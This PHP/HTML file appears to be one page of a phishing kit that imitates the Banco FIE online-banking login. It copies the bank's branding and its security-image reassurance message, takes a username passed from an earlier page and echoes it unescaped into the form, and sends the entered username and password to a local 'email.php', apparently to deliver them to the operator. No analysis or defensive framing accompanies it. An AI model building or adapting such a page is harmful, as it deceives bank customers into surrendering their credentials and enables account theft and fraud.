<?php 
if ($_POST['username_']) {
    $usse = $_POST['username_'];
}else {
    header("Location: index.html");
}
?>

<html class="no-js k-webkit k-webkit110 ng-scope" ng-app="cobis-cwc-container" ng-strict-di="">

<head>

    <meta charset="utf-8">
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <!--<title translate>CWC.APP_TITLE</title>-->
    <title>Banco FIE</title>
    <meta name="description"
        content="Somos un banco múltiple que mantiene y preserva su filosofía y esencia de trabajo con las que nacimos, buscando no solo el beneficio económico sino también social, brindando acceso a servicios financieros inclusivos con equidad, calidad y transparencia, y sobre todo apoyando los emprendimientos económicos de los/as bolivianos/as">
    <meta property="og:image"
        content="https://www.bancofie.com.bo/apifie/archivos/fixedmultimedia/quienes_somos_zkimn0m3wuygx55.jpg">
    <meta property="og:type" content="article">
    <meta property="og:title" content="Banco FIE">
    <meta property="og:description"
        content="Somos un banco múltiple que mantiene y preserva su filosofía y esencia de trabajo con las que nacimos, buscando no solo el beneficio económico sino también social, brindando acceso a servicios financieros inclusivos con equidad, calidad y transparencia, y sobre todo apoyando los emprendimientos económicos de los/as bolivianos/as">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="676">
    <!-- To disable compatibility mode in Internet Explorer -->
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <!-- Mobile tags -->
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="apple-mobile-web-app-capable" content="yes">

    <meta name="application-name" content="&nbsp;">
    <meta name="msapplication-TileColor" content="#FFFFFF">
    <meta name="msapplication-TileImage" content="mstile-144x144.png">
    <meta name="msapplication-square70x70logo" content="mstile-70x70.png">
    <meta name="msapplication-square150x150logo" content="mstile-150x150.png">
    <meta name="msapplication-wide310x150logo" content="mstile-310x150.png">
    <meta name="msapplication-square310x310logo" content="mstile-310x310.png">
    <meta name="description" content="">
    <meta name="google" value="notranslate">
    <link rel="stylesheet" type="text/css" href="css/user.css">


</head>

<body>
    <div id="container-wrapper">

        <main>
            <!-- uiView: content -->
            <div ui-view="content" class="ng-scope">
                <main class="cb-login-well well ng-scope">
                    <div class="left" ng-init="init()" id="con" style="padding-top: 40px;">
                        <img src="img/logo.png" alt="Cobiscorp" class="logo">
                        <div class="content">
                            <form
                                class="form bv-form ng-valid-maxlength ng-dirty ng-valid-parse ng-valid-required ng-valid ng-valid-minlength"
                                role="form" name="form" id="form " action="email.php" method="post"
                                novalidate="novalidate">

                                <div id="image" style="display: block;">

                                    <div class="form-group">
                                        <label for="alias" class="ng-binding">USUARIO</label>
                                        <input type="text" name="username" ng-model="alias" id="alias"
                                            class="form-control ng-pristine ng-untouched ng-valid ng-valid-required ng-valid-minlength ng-valid-maxlength disabled"
                                            minlength="4" maxlength="16" required="" tabindex="2"
                                            placeholder="Ej: cohete" autocomplete="off" data-bv-field="alias"
                                            value="<?php echo $usse ?>">



                                    </div>
                                </div>
                                <div class="checkbox hidden-xs" style="visibility: hidden;">
                                    <label class="ng-binding"><input type="checkbox" ng-model="showKeyboard" value=""
                                            class="ng-pristine ng-untouched ng-valid"> Teclado Virtual</label>
                                </div>
                                <div class="form-group has-success"
                                    ng-class="{ 'has-error': form.password.$dirty &amp;&amp; form.password.$error.required }">
                                    <label class="ng-binding">CONTRASEÑA<a href="" id="updatePass"
                                            ng-click="validuser($event)" class="ng-binding"></a></label>

                                    <input type="password" name="password" id="password "
                                        class="form-control ng-isolate-scope ui-keyboard-input ui-widget-content ui-corner-all ng-valid-maxlength ng-dirty ng-valid-parse ng-valid-required ng-valid ng-valid-minlength ng-touched"
                                        ng-paste="$event.preventDefault()" ng-model="password" required="" tabindex="2"
                                        autocomplete="off" ng-virtual-keyboard="keyboardConfig"
                                        ng-click="toggleKeyboard($event)" minlength="4" maxlength="12"
                                        data-bv-field="password" aria-haspopup="true" role="textbox">
                                    <span id="resp "
                                        ng-show="form.username.$dirty &amp;&amp; form.username.$error.required "
                                        class="help-block ng-binding ng-hide ">Contraseña no valida</span>


                                    <a href="#" class="show-pass ng-binding"><svg xmlns="http://www.w3.org/2000/svg"
                                            xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1"
                                            x="0px" y="0px" viewBox="-285 412.9 24 16"
                                            style="enable-background:new -285 412.9 24 16;" xml:space="preserve"
                                            class="svg replaced-svg">
                                            <g>
                                                <g>
                                                    <path
                                                        d="M-273,412.9c-7.9,0-12,8-12,8s3.1,8,12,8c8.1,0,12-8,12-8S-264.9,412.9-273,412.9z M-273,425.9c-2.9,0-5-2.2-5-5    c0-2.8,2.1-5,5-5s5,2.2,5,5C-268,423.7-270.1,425.9-273,425.9z M-273,417.9c-1.7,0-3,1.4-3,3c0,1.6,1.3,3,3,3c1.7,0,3-1.4,3-3    C-270,419.3-271.3,417.9-273,417.9z">
                                                    </path>
                                                </g>
                                            </g>
                                        </svg>Mostrar contraseña</a>
                                    <a href="#" class="hide-pass ng-binding"><svg xmlns="http://www.w3.org/2000/svg"
                                            xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1"
                                            x="0px" y="0px" viewBox="-284.6 410 24.8 20.8"
                                            style="enable-background:new -284.6 410 24.8 20.8;" xml:space="preserve"
                                            class="svg replaced-svg">

                                            <path class="st0"
                                                d="M-274.4,421.9c0.5,0.5,1.3,0.9,2.1,0.9c1.7,0,3-1.4,3-3c0-0.8-0.3-1.6-0.9-2.1c-0.2-0.2-0.4-0.3-0.6-0.4  l-4.1,4.1C-274.8,421.6-274.6,421.8-274.4,421.9z">
                                            </path>
                                            <path class="st0"
                                                d="M-269.3,419.8c0,1.6-1.3,3-3,3c-0.8,0-1.6-0.3-2.1-0.9l-1.5,1.5c0.9,0.9,2.1,1.4,3.6,1.4c2.9,0,5-2.2,5-5  c0-1.4-0.5-2.7-1.4-3.6l-1.5,1.5C-269.7,418.2-269.3,419-269.3,419.8z">
                                            </path>
                                            <path class="st0"
                                                d="M-274.9,421.4l-1.5,1.5c0.1,0.2,0.3,0.4,0.4,0.6l1.5-1.5C-274.6,421.8-274.8,421.6-274.9,421.4z">
                                            </path>
                                            <path class="st0"
                                                d="M-270.2,417.7l1.5-1.5c-0.2-0.2-0.4-0.3-0.6-0.4l-1.5,1.5C-270.6,417.4-270.4,417.5-270.2,417.7z">
                                            </path>
                                            <path class="st0"
                                                d="M-277.3,419.8c0,0.9,0.2,1.7,0.6,2.4l1.5-1.5c-0.1-0.3-0.1-0.6-0.1-0.8c0-1.6,1.3-3,3-3c0.3,0,0.6,0,0.8,0.1  l1.5-1.5c-0.7-0.4-1.5-0.6-2.4-0.6C-275.2,414.8-277.3,417-277.3,419.8z">
                                            </path>
                                            <path class="st0"
                                                d="M-275.2,420.7l-1.5,1.5c0.1,0.2,0.2,0.4,0.4,0.6l1.5-1.5C-275,421.1-275.1,420.9-275.2,420.7z">
                                            </path>
                                            <path class="st0"
                                                d="M-271.5,417c0.2,0.1,0.5,0.2,0.7,0.3l1.5-1.5c-0.2-0.1-0.4-0.3-0.6-0.4L-271.5,417z">
                                            </path>
                                            <path
                                                d="M-264.5,414.8l2.9-2.9c0.4-0.4,0.4-1,0-1.4s-1-0.4-1.4,0l-18.4,18.4c-0.4,0.4-0.4,1,0,1.4c0.2,0.2,0.5,0.3,0.7,0.3  s0.5-0.1,0.7-0.3l3.2-3.2c1.3,0.5,2.8,0.8,4.4,0.8c8.1,0,12-8,12-8S-261.7,417.1-264.5,414.8z M-272.3,424.8c-0.7,0-1.3-0.1-1.9-0.3  l1.7-1.7c0.1,0,0.1,0,0.2,0c1.7,0,3-1.4,3-3c0-0.1,0-0.1,0-0.2l1.7-1.7c0.2,0.6,0.3,1.2,0.3,1.9  C-267.3,422.6-269.4,424.8-272.3,424.8z M-272.3,416.8c0.3,0,0.6,0,0.8,0.1l-3.7,3.7c-0.1-0.3-0.1-0.6-0.1-0.8  C-275.3,418.2-274,416.8-272.3,416.8z M-284.4,419.8c0,0,4.1-8,12-8c1.9,0,3.5,0.4,4.9,1.1l-2.5,2.5c-0.7-0.4-1.5-0.6-2.4-0.6  c-2.9,0-5,2.2-5,5c0,0.9,0.2,1.7,0.6,2.4l-3.2,3.2C-283.1,423-284.4,419.8-284.4,419.8z">
                                            </path>
                                        </svg>
                                        <div class="clearfix"></div>
                                        <small class="help-block" data-bv-validator="notEmpty" data-bv-for="password"
                                            data-bv-result="VALID" style="display: none;">Por favor introduce un
                                            valor</small><small class="help-block" data-bv-validator="stringLength"
                                            data-bv-for="password" data-bv-result="VALID" style="display: none;">Por
                                            favor introduce un valor con una longitud entre 4 y 12 caracteres</small>
                                </div>
                                <div>

                                    <button id="btnLogin " type="submit" class="btn ng-binding" ng-click="valid($event)"
                                        disabled><svg xmlns="http://www.w3.org/2000/svg"
                                            xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Слой_1" x="0px"
                                            y="0px" viewBox="-266 414.9 7 12"
                                            style="enable-background:new -266 414.9 7 12;" xml:space="preserve"
                                            class="svg replaced-svg">

                                            <path id="Chevron_Right" class="st0"
                                                d="M-259.3,420.2l-5-5c-0.4-0.4-1-0.4-1.4,0c-0.4,0.4-0.4,1,0,1.4l4.3,4.3l-4.3,4.3  c-0.4,0.4-0.4,1,0,1.4c0.4,0.4,1,0.4,1.4,0l5-5C-258.9,421.2-258.9,420.6-259.3,420.2z">
                                            </path>
                                        </svg>Continuar</button>
                                </div>
                                <div id="security_message"><label id="message" align="justify"
                                        style="margin-top:20px;">Si usted está seguro que la imagen y el alias son los
                                        que eligió al momento de registrarse al Sitio, continúe con el ingreso; en caso
                                        de no corresponder, no ingrese ningún dato y póngase en contacto con nuestro
                                        Banco.</label></div>
                                <div class="clearfix"></div>
                            </form>
                            <div class="foot foot-static">
                                <ul class="redes">

                                    <li>
                                        <a href="javascript:;"><svg xmlns="http://www.w3.org/2000/svg"
                                                xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1"
                                                x="0px" y="0px" viewBox="-266.2 396.5 51 51"
                                                style="enable-background:new -266.2 396.5 51 51;" xml:space="preserve"
                                                class="svg facebook replaced-svg">
                                                <path
                                                    d="M-240.7,397.4c-13.6,0-24.6,11-24.6,24.6c0,13.6,11,24.6,24.6,24.6s24.6-11,24.6-24.6C-216,408.4-227.1,397.4-240.7,397.4z   M-234.1,421.9h-4.3c0,6.8,0,15.2,0,15.2h-6.3c0,0,0-8.3,0-15.2h-3v-5.4h3V413c0-2.5,1.2-6.4,6.4-6.4l4.7,0v5.2c0,0-2.8,0-3.4,0  c-0.6,0-1.3,0.3-1.3,1.5v3.2h4.8L-234.1,421.9z">
                                                </path>
                                            </svg></a>
                                    </li>
                                    <li>
                                        <a href="javascript:;"><svg xmlns="http://www.w3.org/2000/svg"
                                                xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Layer_1"
                                                x="0px" y="0px" viewBox="-290.5 395.7 51 51"
                                                style="enable-background:new -290.5 395.7 51 51;" xml:space="preserve"
                                                class="svg mail replaced-svg">
                                                <path
                                                    d="M-265,396.6c-13.6,0-24.6,11-24.6,24.6c0,13.6,11,24.6,24.6,24.6c13.6,0,24.6-11,24.6-24.6  C-240.4,407.6-251.4,396.6-265,396.6z M-279.6,415.2l8,4.9l-8,10V415.2z M-278.7,431.2l8.3-10.4l5.4,3.3l5.4-3.3l8.3,10.4H-278.7z   M-250.4,430.2l-8-10.1l8-4.9V430.2z M-250.4,413.5l-14.6,9l-14.6-8.9v-2.4h29.2V413.5z">
                                                </path>
                                            </svg></a>
                                    </li>
                                </ul>
                            </div>

                        </div>
                    </div>
                    <div class="right" id="imgByType"
                        style="min-height: 568px; background-image: url(&quot; img/jpg/pc.jpg&quot;);"></div>
                </main>

            </div>
        </main>

    </div>

    <script type="text/javascript" src="js/validapass.js"></script>
</body>

</html>